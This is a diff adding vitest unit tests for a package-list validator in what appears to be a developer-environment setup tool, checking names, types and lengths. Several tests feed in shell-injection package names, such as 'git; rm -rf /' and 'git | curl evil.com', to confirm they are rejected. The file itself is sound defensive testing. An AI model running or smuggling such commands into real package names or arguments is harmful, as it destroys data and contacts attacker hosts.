@@ -1,5 +1,10 @@
 import { describe, it, expect } from 'vitest';
-import { validateCustomScript, validateDotfilesRepo, validateReturnTo } from './validation';
+import {
+	validateCustomScript,
+	validateDotfilesRepo,
+	validateReturnTo,
+	validatePackages
+} from './validation';
 
 describe('validateCustomScript', () => {
 	it('should accept null or undefined', () => {
@@ -238,5 +243,204 @@ describe('validateReturnTo', () => {
 		expect(validateReturnTo('/dashboard')).toBe(true);
 		expect(validateReturnTo('/docs/config-options')).toBe(true);
 		expect(validateReturnTo('/user/my-config')).toBe(true);
+	});
+});
+
+describe('validatePackages', () => {
+	it('should accept null or undefined', () => {
+		expect(validatePackages(null).valid).toBe(true);
+		expect(validatePackages(undefined).valid).toBe(true);
+	});
+
+	it('should accept empty array', () => {
+		expect(validatePackages([]).valid).toBe(true);
+	});
+
+	it('should accept valid packages', () => {
+		const packages = [
+			{ name: 'git', type: 'formula', desc: 'Version control' },
+			{ name: 'visual-studio-code', type: 'cask', desc: 'Code editor' },
+			{ name: '@vue/cli', type: 'npm', desc: 'Vue CLI' }
+		];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(true);
+		expect(result.error).toBeUndefined();
+	});
+
+	it('should accept packages without description', () => {
+		const packages = [
+			{ name: 'git', type: 'formula' },
+			{ name: 'node', type: 'formula' }
+		];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(true);
+	});
+
+	it('should accept scoped npm packages', () => {
+		const packages = [
+			{ name: '@react/core', type: 'npm' },
+			{ name: '@babel/preset-env', type: 'npm' }
+		];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(true);
+	});
+
+	it('should accept packages with slashes (go modules, npm scopes)', () => {
+		const packages = [
+			{ name: 'github.com/user/repo', type: 'go' },
+			{ name: '@org/package', type: 'npm' }
+		];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(true);
+	});
+
+	it('should reject non-array input', () => {
+		const result = validatePackages('not an array' as any);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('must be an array');
+	});
+
+	it('should reject more than 500 packages', () => {
+		const packages = Array.from({ length: 501 }, (_, i) => ({
+			name: `pkg${i}`,
+			type: 'formula'
+		}));
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('Maximum 500 packages');
+	});
+
+	it('should reject non-object package entries', () => {
+		const packages = ['git', 'node'] as any;
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('must be an object');
+	});
+
+	it('should reject packages without name', () => {
+		const packages = [{ type: 'formula' }] as any;
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('must have a string name');
+	});
+
+	it('should reject packages with non-string name', () => {
+		const packages = [{ name: 123, type: 'formula' }] as any;
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('must have a string name');
+	});
+
+	it('should reject package name longer than 200 characters', () => {
+		const packages = [{ name: 'a'.repeat(201), type: 'formula' }];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('too long');
+	});
+
+	it('should reject invalid type', () => {
+		const packages = [{ name: 'git', type: 'invalid' }] as any;
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('Invalid package type');
+	});
+
+	it('should reject shell injection via semicolon', () => {
+		const packages = [{ name: 'git; rm -rf /', type: 'formula' }];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('Invalid package name');
+	});
+
+	it('should reject shell injection via pipe', () => {
+		const packages = [{ name: 'git | curl evil.com', type: 'formula' }];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('Invalid package name');
+	});
+
+	it('should reject shell injection via backticks', () => {
+		const packages = [{ name: 'git`whoami`', type: 'formula' }];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('Invalid package name');
+	});
+
+	it('should reject shell injection via dollar sign', () => {
+		const packages = [{ name: 'git$(whoami)', type: 'formula' }];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('Invalid package name');
+	});
+
+	it('should reject command substitution', () => {
+		const packages = [{ name: 'git && curl evil.com', type: 'formula' }];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('Invalid package name');
+	});
+
+	it('should reject redirect operators', () => {
+		const packages = [{ name: 'git > /tmp/pwned', type: 'formula' }];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('Invalid package name');
+	});
+
+	it('should reject newline injection', () => {
+		const packages = [{ name: 'git\ncurl evil.com', type: 'formula' }];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('Invalid package name');
+	});
+
+	it('should accept all valid package types', () => {
+		const types = ['formula', 'cask', 'tap', 'mas', 'npm', 'pip', 'gem', 'cargo', 'go'];
+		for (const type of types) {
+			const packages = [{ name: 'valid-package', type }];
+			const result = validatePackages(packages);
+
+			expect(result.valid).toBe(true);
+		}
+	});
+
+	it('should reject description longer than 500 characters', () => {
+		const packages = [
+			{
+				name: 'git',
+				type: 'formula',
+				desc: 'a'.repeat(501)
+			}
+		];
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('description');
+	});
+
+	it('should reject non-string description', () => {
+		const packages = [{ name: 'git', type: 'formula', desc: 123 }] as any;
+		const result = validatePackages(packages);
+
+		expect(result.valid).toBe(false);
+		expect(result.error).toContain('description');
 	});
 });
